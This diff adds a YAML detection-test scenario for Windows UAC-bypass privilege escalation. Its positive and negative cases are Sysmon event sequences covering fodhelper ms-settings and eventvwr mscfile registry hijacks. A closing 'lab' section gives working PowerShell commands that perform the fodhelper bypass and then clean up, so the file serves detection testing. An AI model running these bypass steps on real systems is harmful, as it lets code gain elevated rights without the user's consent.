@@ -1,0 +1,33 @@
+scenario: SCE_PrivEsc_UAC_Bypass
+cases:
+  - name: positive_fodhelper_ms_settings_hijack
+    expect_incidents: [privesc_uac_bypass]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\reg.exe', OriginalFileName: reg.exe, CommandLine: 'reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\Users\Public\p.exe" /f', ParentImage: 'C:\Windows\System32\cmd.exe', User: 'LAB\victim', IntegrityLevel: Medium}
+      - at: 1
+        event: {EventID: 13, Channel: Microsoft-Windows-Sysmon/Operational, EventType: SetValue, Image: 'C:\Windows\System32\reg.exe', TargetObject: 'HKU\S-1-5-21-1-2-3-1001_Classes\ms-settings\shell\open\command\(Default)', Details: 'C:\Users\Public\p.exe'}
+      - at: 5
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Users\Public\p.exe', ParentImage: 'C:\Windows\System32\fodhelper.exe', IntegrityLevel: High, User: 'LAB\victim'}
+  - name: positive_eventvwr_mscfile_hijack
+    expect_incidents: [privesc_uac_bypass]
+    events:
+      - event: {EventID: 13, Channel: Microsoft-Windows-Sysmon/Operational, EventType: SetValue, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', TargetObject: 'HKU\S-1-5-21-1-2-3-1001_Classes\mscfile\shell\open\command', Details: 'cmd.exe /c C:\Users\Public\p.exe'}
+      - at: 4
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\cmd.exe', CommandLine: 'cmd.exe /c C:\Users\Public\p.exe', ParentImage: 'C:\Windows\System32\eventvwr.exe', IntegrityLevel: High}
+  - name: negative_hijack_without_trigger
+    expect_incidents: []
+    events:
+      - event: {EventID: 13, Channel: Microsoft-Windows-Sysmon/Operational, EventType: SetValue, Image: 'C:\Windows\System32\reg.exe', TargetObject: 'HKU\S-1-5-21-1-2-3-1001_Classes\ms-settings\shell\open\command\(Default)', Details: 'C:\Users\Public\p.exe'}
+  - name: negative_trigger_before_hijack
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\control.exe', ParentImage: 'C:\Windows\System32\fodhelper.exe', IntegrityLevel: High}
+      - at: 30
+        event: {EventID: 13, Channel: Microsoft-Windows-Sysmon/Operational, EventType: SetValue, Image: 'C:\Windows\System32\reg.exe', TargetObject: 'HKU\S-1-5-21-1-2-3-1001_Classes\ms-settings\shell\open\command\(Default)', Details: 'C:\Users\Public\p.exe'}
+  - name: negative_eventvwr_opens_mmc
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\mmc.exe', CommandLine: '"C:\Windows\system32\mmc.exe" "C:\Windows\system32\eventvwr.msc"', ParentImage: 'C:\Windows\System32\eventvwr.exe'}
+lab:
+  - 'New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null; New-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name DelegateExecute -Value "" -Force | Out-Null; Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c whoami > C:\Users\Public\uac.txt" -Force'
+  - 'Start-Process C:\Windows\System32\fodhelper.exe; Start-Sleep 3; Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force'
